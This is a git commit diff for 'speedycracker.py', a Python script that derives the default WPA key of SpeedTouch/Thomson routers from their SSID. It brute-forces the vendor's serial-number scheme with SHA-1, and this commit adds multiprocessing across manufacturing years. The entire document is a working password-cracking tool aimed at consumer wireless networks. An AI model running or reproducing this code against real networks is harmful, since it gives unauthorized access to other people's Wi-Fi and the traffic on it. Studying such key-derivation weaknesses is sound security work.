94b6d95784eed236d25319198cce792a146799fa
Tasos <twilight0@myopera.com>
2012-04-08 00:32:36 +0300

    improved script and added multithreading support

--- speedycracker.py
+++ speedycracker.py
@@ -1,36 +1,49 @@
 #!/usr/bin/env python
- 
+
 import sys
 import hashlib
-from binascii import hexlify as hexl
-from itertools import product as prod
- 
+from binascii import hexlify, unhexlify
+from itertools import product
+from multiprocessing import Process
+
 try:
     import psyco
     psyco.full()
 except:
     pass
- 
+
+
+def do_year(year):
+    print "Searching year %02d..." % year
+    serial_y = "CP%02d" % (year)
+    for week in xrange(1, 53):
+        serial_w = "%s%02d" % (serial_y, week)
+        for xxx in product(hexchars, repeat=3):
+            sha = hashlib.sha1(serial_w + "".join(xxx)).hexdigest()
+            if sha.endswith(ssid):
+                print "  Likely key: %s (serial %s). Year 20%02d" % (sha[:10], "CP%02d%02d??%s" % (year, week, unhexlify("".join(xxx))), year)
+
+
 if len(sys.argv) != 2:
-    print "speedcracker.py <ssid>"
+    print "speedtouchkey.py <ssid>"
     sys.exit(1)
- 
+
 chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+hexchars = map(str.upper, map(hexlify, chars))
 ssid = sys.argv[1].lower().strip()
- 
+
 try:
     int(ssid, 16)
 except ValueError:
     print "%s is not a valid SSID." % ssid
     sys.exit(1)
- 
-for year in range(8,11):
-    print "Searching year %02d..." % year
-    for week in range(1, 53):
-        for xxx in prod(chars, chars, chars):
-            xx = "".join(xxx)
-            serial = "CP%02d%02d%s" % (year, week, hexl(xx).upper())
-            sha = hashlib.sha1(serial).hexdigest()
-            if sha.endswith(ssid):
-                print "  Likely key: %s (serial %s)." % (sha[:10], "CP%02d%02d??%s" % (year, week, xx))
 
+q = []
+for year in xrange(6,12):
+    process = Process(target=do_year, args=(year,))
+    process.start()
+    q += [process]
+
+print "all available threads are now being used"
+for process in q:
+    process.join()
